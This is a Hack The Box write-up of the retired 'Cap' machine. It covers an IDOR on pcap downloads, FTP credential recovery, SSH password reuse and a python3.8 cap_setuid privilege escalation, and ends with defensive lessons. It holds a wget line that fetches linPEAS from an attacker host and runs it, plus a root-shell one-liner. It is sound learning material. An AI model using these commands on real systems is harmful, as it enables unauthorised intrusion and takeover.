# Hack The Box: Cap

A write-up of the retired **Cap** machine (Easy, Linux). Done as self-directed
learning — notes written as I worked, in the order I found things.

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 20.04) |
| **Status** | Retired |

**Attack chain:** IDOR on a packet-capture download → FTP credentials recovered
from the `.pcap` → password reuse onto SSH (user) → `cap_setuid` capability on
`python3.8` → root.

> Credentials below are redacted. The target IP (`10.129.x.x`) is per-session and
> has been left generic.

---

## 1. Enumeration

### 1.1 Port scan

```bash
nmap -sV -sC -p- <target>
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

Only three services, all on standard ports:

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.3 | FTP. Anonymous login disabled (the `ftp-anon` script returned nothing). |
| 22 | OpenSSH 8.2p1 | Not an entry point on its own; useful once credentials exist. |
| 80 | Gunicorn | Python web server (Flask/Django). The largest attack surface. |

> The scan ran without root, so Nmap used a TCP connect scan (`-sT`); hence the
> `conn-refused` state on closed ports.

### 1.2 Web application

Port 80 serves a **"Security Dashboard"** — a monitoring tool that runs network
commands server-side and prints the output:

- **IP Config** — `ifconfig`-style interface data.
- **Network Status** — `netstat`-style connection/listener list.
- **Security Snapshot (5 Second PCAP + Analysis)** — captures 5 seconds of
  traffic and offers the resulting `.pcap` for download. **This is the way in.**

---

## 2. Foothold

### 2.1 IDOR on the capture downloads

Each Security Snapshot is served by a numeric id in the URL
(`/data/<id>`, downloadable as `<id>.pcap`). Nothing verifies that the capture
belongs to the requesting user, so changing the id reaches **other users'
captures** — an **Insecure Direct Object Reference (IDOR)**, a broken-access-control
flaw.

My own capture was empty, but capture **`0`** (`/data/0` → `0.pcap`) contained
real traffic.

### 2.2 Credentials from the PCAP

Opening `0.pcap` in Wireshark and following the TCP stream revealed an **FTP**
login. FTP transmits credentials in cleartext, so they were readable directly:

```
user: nathan
pass: Buck3t••••••••   (redacted)
```

### 2.3 Password reuse → SSH

The same credentials were tried on SSH — password reuse across services is
extremely common:

```bash
ssh nathan@<target>
cat ~/user.txt        # user flag
```

Shell obtained as `nathan`. **User flag captured.**

---

## 3. Privilege escalation

### 3.1 Enumeration with linPEAS

The box has **no outbound internet**, so linPEAS was downloaded on the attacker
machine and transferred in over HTTP:

```bash
# attacker
python3 -m http.server 80
# target
wget http://<attacker-vpn-ip>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.txt
```

> `nathan`'s FTP root is read-only (`550 Permission denied` on upload), so FTP is
> download-only. HTTP pull — or `scp` to `/tmp` — works instead.

### 3.2 A Linux capability on Python

linPEAS flagged a file capability (also findable by hand with
`getcap -r / 2>/dev/null`):

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The other capability-bearing binaries (`ping`, `traceroute6`, `mtr-packet` →
`cap_net_raw`) are normal for networking tools and are distractors.
**`cap_setuid` on a full interpreter** is the problem: it lets `python3.8` change
its own UID to 0 without being a root-owned SUID binary.

> **Capabilities vs SUID.** SUID runs a binary as its *owner* — all-or-nothing.
> Linux capabilities split root's powers into ~40 pieces and grant a binary just
> one. Finer-grained, but `cap_setuid` on something that executes arbitrary code
> is just as fatal as SUID-root.

### 3.3 Root

From GTFOBins (`python` → **Capabilities**), calling the exact binary that holds
the capability:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
id                    # uid=0(root)
cat /root/root.txt    # root flag
```

`os.setuid(0)` promotes the process to root (permitted by `cap_setuid`), then
`os.execl` replaces it with a shell — running as **root**. **Root flag captured.**

---

## 4. Lessons learned

- **Cleartext protocols leak secrets.** FTP credentials were readable straight out
  of a packet capture — the defensive reason to flag or forbid cleartext auth.
- **IDOR.** Serving objects by a guessable id with no ownership check exposes other
  users' data. Access control must be enforced server-side, per object.
- **Password reuse.** One leaked credential, reused across services, turned limited
  file access into a shell. Unique passwords and MFA break this chain.
- **Capabilities are a privesc vector, not just SUID.** Enumerate `getcap -r /`
  alongside SUID binaries; `cap_setuid` on an interpreter is instant root.

---

*Written up for learning purposes. Cap is a retired Hack The Box machine; public
write-ups of retired machines are permitted under HTB's policy.*
